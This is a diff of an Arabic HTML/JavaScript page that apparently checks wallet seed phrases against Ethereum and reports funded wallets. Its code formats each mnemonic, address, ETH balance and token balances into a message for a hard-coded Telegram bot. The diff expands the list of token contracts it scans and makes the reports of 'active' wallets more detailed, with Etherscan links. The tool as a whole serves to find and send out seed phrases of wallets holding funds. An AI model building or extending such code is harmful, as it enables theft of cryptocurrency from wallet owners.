@@ -1,4 +1,4 @@
-oooops
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -515,6 +515,30 @@ oooops
         .token-item:last-child {
             border-bottom: none;
         }
+
+        .activity-reason {
+            margin: 10px 0;
+            padding: 8px 12px;
+            background: #e8f5e8;
+            border-radius: 5px;
+            color: #2d5a2d;
+            font-weight: 500;
+        }
+
+        .etherscan-link {
+            margin-top: 10px;
+            padding: 8px 0;
+        }
+
+        .etherscan-link a {
+            color: #4facfe;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .etherscan-link a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
@@ -835,8 +859,9 @@ oooops
         const TELEGRAM_CHAT_ID = '910021564';
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-        // قائمة العملات المشهورة المضافة
+        // قائمة العملات المشهورة المضافة - محدثة ومحسنة
         const POPULAR_TOKENS = [
+            // العملات المستقرة الأساسية
             {
                 symbol: 'USDT',
                 address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
@@ -853,6 +878,18 @@ oooops
                 decimals: 18
             },
             {
+                symbol: 'BUSD',
+                address: '0x4Fabb145d64652a948d72533023f6E7A623C7C53',
+                decimals: 18
+            },
+            {
+                symbol: 'FRAX',
+                address: '0x853d955aCEf822Db058eb8505911ED77F175b99e',
+                decimals: 18
+            },
+
+            // عملات DeFi الرئيسية
+            {
                 symbol: 'LINK',
                 address: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
                 decimals: 18
@@ -863,18 +900,106 @@ oooops
                 decimals: 18
             },
             {
-                symbol: 'WBTC',
-                address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
-                decimals: 8
-            },
-            {
                 symbol: 'AAVE',
                 address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
                 decimals: 18
             },
             {
+                symbol: 'COMP',
+                address: '0xc00e94Cb662C3520282E6f5717214004A7f26888',
+                decimals: 18
+            },
+            {
+                symbol: 'MKR',
+                address: '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2',
+                decimals: 18
+            },
+            {
+                symbol: 'YFI',
+                address: '0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e',
+                decimals: 18
+            },
+            {
+                symbol: 'SUSHI',
+                address: '0x6B3595068778DD592e39A122f4f5a5cF09C90fE2',
+                decimals: 18
+            },
+            {
+                symbol: 'CRV',
+                address: '0xD533a949740bb3306d119CC777fa900bA034cd52',
+                decimals: 18
+            },
+
+            // العملات الأساسية المغلفة
+            {
+                symbol: 'WBTC',
+                address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
+                decimals: 8
+            },
+            {
+                symbol: 'WETH',
+                address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
+                decimals: 18
+            },
+
+            // عملات الميم والشائعة
+            {
                 symbol: 'SHIB',
                 address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
+                decimals: 18
+            },
+            {
+                symbol: 'DOGE',
+                address: '0x4206931337dc273a630d328dA6441786BfaD668f',
+                decimals: 8
+            },
+            {
+                symbol: 'PEPE',
+                address: '0x6982508145454Ce325dDbE47a25d4ec3d2311933',
+                decimals: 18
+            },
+
+            // عملات الألعاب والميتافيرس
+            {
+                symbol: 'MANA',
+                address: '0x0F5D2fB29fb7d3CFeE444a200298f468908cC942',
+                decimals: 18
+            },
+            {
+                symbol: 'SAND',
+                address: '0x3845badAde8e6dFF049820680d1F14bD3903a5d0',
+                decimals: 18
+            },
+            {
+                symbol: 'AXS',
+                address: '0xBB0E17EF65F82Ab018d8EDd776e8DD940327B28b',
+                decimals: 18
+            },
+            {
+                symbol: 'APE',
+                address: '0x4d224452801ACEd8B2F0aebE155379bb5D594381',
+                decimals: 18
+            },
+
+            // عملات أخرى مهمة
+            {
+                symbol: 'LDO',
+                address: '0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32',
+                decimals: 18
+            },
+            {
+                symbol: 'FTM',
+                address: '0x4E15361FD6b4BB609Fa63C81A2be19d873717870',
+                decimals: 18
+            },
+            {
+                symbol: 'MATIC',
+                address: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0',
+                decimals: 18
+            },
+            {
+                symbol: 'BNB',
+                address: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52',
                 decimals: 18
             }
         ];
@@ -1095,7 +1220,7 @@ oooops
             }
         }
 
-        // تحديث دالة formatWalletMessage لعرض جميع العملات
+        // تحديث دالة formatWalletMessage لعرض جميع العملات - محسنة
         function formatWalletMessage(mnemonic, address, walletDetails, isActive) {
             const timestamp = new Date().toLocaleString('ar-EG', {
                 timeZone: 'Africa/Cairo',
@@ -1117,29 +1242,56 @@ oooops
             message += `📝 <b>العبارة:</b>\n<code>${mnemonic}</code>\n\n`;
             message += `📍 <b>العنوان:</b>\n<code>${address}</code>\n\n`;
             
+            // عرض رصيد الإيثريوم
             if (walletDetails.balance !== null) {
-                message += `💰 <b>رصيد ETH:</b> ${walletDetails.balance.toFixed(6)} ETH\n`;
+                const ethBalance = walletDetails.balance.toFixed(6);
+                if (walletDetails.balance > 0) {
+                    message += `💰 <b>رصيد ETH:</b> ${ethBalance} ETH 💎\n`;
+                } else {
+                    message += `💰 <b>رصيد ETH:</b> ${ethBalance} ETH\n`;
+                }
             }
             
+            // عرض عدد المعاملات
             if (walletDetails.transactionCount !== null) {
                 message += `📊 <b>عدد المعاملات:</b> ${walletDetails.transactionCount}\n`;
             }
             
-            // إضافة أرصدة العملات الأخرى
+            // عرض أرصدة العملات الأخرى مع تحسينات
             if (walletDetails.tokenBalances.length > 0) {
-                message += `\n🪙 <b>العملات الأخرى:</b>\n`;
-                walletDetails.tokenBalances.forEach(token => {
-                    message += `   ${token.symbol}: ${token.balance.toFixed(4)}\n`;
+                message += `\n🪙 <b>العملات الأخرى المكتشفة (${walletDetails.tokenBalances.length}):</b>\n`;
+                
+                // ترتيب العملات حسب الرصيد (الأعلى أولاً)
+                const sortedTokens = walletDetails.tokenBalances.sort((a, b) => b.balance - a.balance);
+                
+                sortedTokens.forEach((token, index) => {
+                    const balanceFormatted = token.balance > 1 ? token.balance.toFixed(2) : token.balance.toFixed(6);
+                    const emoji = index === 0 ? '🥇' : index === 1 ? '🥈' : index === 2 ? '🥉' : '💰';
+                    message += `   ${emoji} <b>${token.symbol}:</b> ${balanceFormatted}\n`;
                 });
+                
+                // إضافة إجمالي قيمة العملات إذا كان هناك أكثر من عملة واحدة
+                if (walletDetails.tokenBalances.length > 1) {
+                    message += `\n📈 <b>إجمالي العملات المكتشفة:</b> ${walletDetails.tokenBalances.length} عملة\n`;
+                }
             }
             
+            // عرض الحالة مع تحسينات
             if (isActive) {
-                message += `\n✅ <b>الحالة:</b> محفظة نشطة\n`;
+                const reasons = [];
+                if (walletDetails.hasBalance) reasons.push('رصيد ETH');
+                if (walletDetails.hasTokens) reasons.push('عملات أخرى');
+                if (walletDetails.hasTransactions) reasons.push('معاملات سابقة');
+                
+                message += `\n✅ <b>الحالة:</b> محفظة نشطة 🔥\n`;
+                message += `🔍 <b>سبب النشاط:</b> ${reasons.join(' + ')}\n`;
             } else {
                 message += `\n❌ <b>الحالة:</b> محفظة فارغة\n`;
             }
             
             message += `\n⏰ <b>الوقت:</b> ${timestamp}`;
+            message += `\n🔗 <b>رابط Etherscan:</b> https://etherscan.io/address/${address}`;
+            
             return message;
         }
 
@@ -1310,32 +1462,49 @@ oooops
             }
         }
 
-        // تحديث دالة عرض النتائج اليدوية
+        // تحديث دالة عرض النتائج اليدوية - محسنة
         function updateManualTestResult(mnemonic, address, walletStatus) {
             let resultHTML = '';
             
             if (walletStatus.isActive) {
+                // تحديد أسباب النشاط
+                const reasons = [];
+                if (walletStatus.hasBalance) reasons.push('رصيد ETH');
+                if (walletStatus.hasTokens) reasons.push('عملات أخرى');
+                if (walletStatus.hasTransactions) reasons.push('معاملات سابقة');
+                
                 resultHTML = `
-                    <h4>✅ نتيجة الفحص: المحفظة نشطة</h4>
-                    <div class="status active">محفظة نشطة</div>
+                    <h4>🎉 نتيجة الفحص: المحفظة نشطة!</h4>
+                    <div class="status active">محفظة نشطة 🔥</div>
                     <div class="balance ${walletStatus.balance > 0 ? 'positive' : 'zero'}">
                         💰 رصيد ETH: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' ETH' : 'غير معروف'}
+                        ${walletStatus.balance > 0 ? ' 💎' : ''}
                     </div>
                     <div class="transactions">
                         📊 عدد المعاملات: ${walletStatus.transactionCount !== null ? walletStatus.transactionCount : 'غير معروف'}
                     </div>
+                    <div class="activity-reason">
+                        🔍 سبب النشاط: ${reasons.join(' + ')}
+                    </div>
                 `;
                 
                 if (walletStatus.tokenBalances.length > 0) {
+                    // ترتيب العملات حسب الرصيد
+                    const sortedTokens = walletStatus.tokenBalances.sort((a, b) => b.balance - a.balance);
+                    
                     resultHTML += `
                         <div class="token-list">
-                            <strong>🪙 العملات الأخرى:</strong>
-                            ${walletStatus.tokenBalances.map(token => `
-                                <div class="token-item">
-                                    <span>${token.symbol}</span>
-                                    <span>${token.balance.toFixed(4)}</span>
-                                </div>
-                            `).join('')}
+                            <strong>🪙 العملات المكتشفة (${walletStatus.tokenBalances.length}):</strong>
+                            ${sortedTokens.map((token, index) => {
+                                const balanceFormatted = token.balance > 1 ? token.balance.toFixed(2) : token.balance.toFixed(6);
+                                const emoji = index === 0 ? '🥇' : index === 1 ? '🥈' : index === 2 ? '🥉' : '💰';
+                                return `
+                                    <div class="token-item">
+                                        <span>${emoji} ${token.symbol}</span>
+                                        <span>${balanceFormatted}</span>
+                                    </div>
+                                `;
+                            }).join('')}
                         </div>
                     `;
                 }
@@ -1344,6 +1513,9 @@ oooops
                     <div class="wallet-details">
                         <div class="mnemonic">📝 العبارة: ${mnemonic}</div>
                         <div class="address">📍 العنوان: ${address}</div>
+                        <div class="etherscan-link">
+                            🔗 <a href="https://etherscan.io/address/${address}" target="_blank">عرض في Etherscan</a>
+                        </div>
                     </div>
                 `;
                 elements.manualTestResult.className = 'test-result active';
@@ -1359,16 +1531,23 @@ oooops
                     </div>
                 `;
                 
+                // عرض العملات حتى لو كانت المحفظة فارغة (في حالة وجود عملات بدون معاملات)
                 if (walletStatus.tokenBalances.length > 0) {
+                    const sortedTokens = walletStatus.tokenBalances.sort((a, b) => b.balance - a.balance);
+                    
                     resultHTML += `
                         <div class="token-list">
-                            <strong>🪙 العملات الأخرى:</strong>
-                            ${walletStatus.tokenBalances.map(token => `
-                                <div class="token-item">
-                                    <span>${token.symbol}</span>
-                                    <span>${token.balance.toFixed(4)}</span>
-                                </div>
-                            `).join('')}
+                            <strong>🪙 العملات المكتشفة (${walletStatus.tokenBalances.length}):</strong>
+                            ${sortedTokens.map((token, index) => {
+                                const balanceFormatted = token.balance > 1 ? token.balance.toFixed(2) : token.balance.toFixed(6);
+                                const emoji = index === 0 ? '🥇' : index === 1 ? '🥈' : index === 2 ? '🥉' : '💰';
+                                return `
+                                    <div class="token-item">
+                                        <span>${emoji} ${token.symbol}</span>
+                                        <span>${balanceFormatted}</span>
+                                    </div>
+                                `;
+                            }).join('')}
                         </div>
                     `;
                 }
@@ -1377,6 +1556,9 @@ oooops
                     <div class="wallet-details">
                         <div class="mnemonic">📝 العبارة: ${mnemonic}</div>
                         <div class="address">📍 العنوان: ${address}</div>
+                        <div class="etherscan-link">
+                            🔗 <a href="https://etherscan.io/address/${address}" target="_blank">عرض في Etherscan</a>
+                        </div>
                     </div>
                 `;
                 elements.manualTestResult.className = 'test-result inactive';
